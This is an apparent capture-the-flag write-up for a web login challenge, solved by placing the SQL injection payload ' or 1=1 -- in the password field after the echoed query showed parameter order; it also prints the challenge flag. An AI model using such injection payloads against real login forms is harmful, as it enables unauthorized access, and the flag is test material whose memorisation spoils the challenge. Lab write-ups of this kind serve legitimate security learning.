## Challenge Discription 

`Can you find the flag on this website.`

## Intuition

After launching the instance, were shown with a login screen. My first thought is to try the usual sql injection 
```
Username: admin' or 1=1 --
Password: admin
```
The app responded us with:
```
username: admin' or 1=1--
password: admin
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin' or 1=1--'
```

as we can see in the SQL query section, the password was the parameter before username. 

So next I tried 
```
Username: admin
Password: ' or 1=1 --
```

and logged in successfully. 

## Solution

So wierdly the flag was in the http responce after logging in

### Flag: academy{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_eb64a27a}

PS: I'm pretty sure this challenge isn't solved like this cuz otherwise this challenge should be labelled as easy and not medium
